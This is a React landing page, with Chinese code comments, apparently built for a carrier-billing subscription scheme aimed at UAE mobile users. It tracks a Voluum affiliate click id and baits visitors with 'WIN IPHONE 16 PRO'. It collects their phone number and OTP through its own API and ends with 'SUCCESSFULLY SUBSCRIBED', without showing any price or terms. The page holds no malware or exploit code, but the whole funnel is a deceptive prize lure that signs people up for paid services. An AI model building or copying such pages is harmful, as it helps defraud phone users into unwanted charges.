
import { useState, useEffect } from "react";

export default function Home() {

  const [clickId, setClickId] = useState("");
  const [msisdn, setMsisdn] = useState("");
  const [pin, setPin] = useState("");
  const [txid, setTxid] = useState("");

  const [message, setMessage] = useState("");
  const [step, setStep] = useState(1);

  const [loading, setLoading] = useState(false);

  // 抓 Voluum click id
  useEffect(() => {

    const params = new URLSearchParams(window.location.search);

    if (params.get("cid")) {
      setClickId(params.get("cid"));
    }

  }, []);

  // 请求 PIN
  async function requestPIN() {

    if (!msisdn) {
      setMessage("请输入手机号");
      return;
    }

    setLoading(true);

    let cleanMsisdn = msisdn.trim();

    // 去掉 0
    if (cleanMsisdn.startsWith("0")) {
      cleanMsisdn = cleanMsisdn.substring(1);
    }

    // 自动补 971
    if (!cleanMsisdn.startsWith("971")) {
      cleanMsisdn = "971" + cleanMsisdn;
    }

    try {

      const response = await fetch("/api/request", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          msisdn: cleanMsisdn,
          click_id: clickId
        })
      });

      const data = await response.json();

      if (data.success) {

        setTxid(data.txid);

        setStep(2);

        setMessage("OTP 已发送");

      } else {

        setMessage("号码不符合资格");

      }

    } catch (err) {

      setMessage("系统错误");

    }

    setLoading(false);

  }

  // verify OTP
  async function verifyPIN() {

    if (!pin) {
      setMessage("请输入 OTP");
      return;
    }

    setLoading(true);

    try {

      const response = await fetch("/api/verify", {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          txid,
          pin,
          click_id: clickId
        })

      });

      const data = await response.json();

      if (data.success) {

        setStep(3);

      } else {

        setMessage("OTP 错误");

      }

    } catch (err) {

      setMessage("验证失败");

    }

    setLoading(false);

  }

  return (

    <div style={styles.body}>

      <div style={styles.card}>

        <h1 style={styles.title}>
          WIN IPHONE 16 PRO
        </h1>

        <p style={styles.subtitle}>
          UAE Exclusive Offer
        </p>

        {step === 1 && (

          <>

            <input
              type="tel"
              placeholder="50xxxxxxx"
              value={msisdn}
              onChange={(e) =>
                setMsisdn(
                  e.target.value.replace(/\D/g, "")
                )
              }
              style={styles.input}
            />

            <button
              style={styles.button}
              onClick={requestPIN}
            >
              {loading ? "Loading..." : "GET OTP"}
            </button>

          </>

        )}

        {step === 2 && (

          <>

            <input
              type="tel"
              placeholder="Enter OTP"
              value={pin}
              onChange={(e) =>
                setPin(
                  e.target.value.replace(/\D/g, "")
                )
              }
              style={styles.input}
            />

            <button
              style={styles.button}
              onClick={verifyPIN}
            >
              {loading ? "Verifying..." : "VERIFY OTP"}
            </button>

          </>

        )}

        {step === 3 && (

          <div style={styles.success}>
            SUCCESSFULLY SUBSCRIBED 🎉
          </div>

        )}

        <div style={styles.message}>
          {message}
        </div>

      </div>

    </div>

  );

}

const styles = {

  body: {

    background:
      "linear-gradient(to bottom,#6a00ff,#21003d)",

    minHeight: "100vh",

    display: "flex",

    justifyContent: "center",

    alignItems: "center",

    fontFamily: "Arial",

    padding: "20px"

  },

  card: {

    background: "white",

    width: "100%",

    maxWidth: "420px",

    borderRadius: "20px",

    padding: "30px",

    textAlign: "center"

  },

  title: {

    fontSize: "36px",

    fontWeight: "bold",

    marginBottom: "10px"

  },

  subtitle: {

    marginBottom: "25px",

    color: "#555"

  },

  input: {

    width: "100%",

    height: "55px",

    borderRadius: "12px",

    border: "1px solid #ccc",

    marginBottom: "15px",

    padding: "0 15px",

    fontSize: "20px"

  },

  button: {

    width: "100%",

    height: "55px",

    borderRadius: "12px",

    border: "none",

    background: "#6a00ff",

    color: "white",

    fontSize: "20px",

    fontWeight: "bold",

    cursor: "pointer"

  },

  success: {

    fontSize: "28px",

    color: "green",

    fontWeight: "bold"

  },

  message: {

    marginTop: "20px",

    color: "red",

    fontWeight: "bold"

  }

};
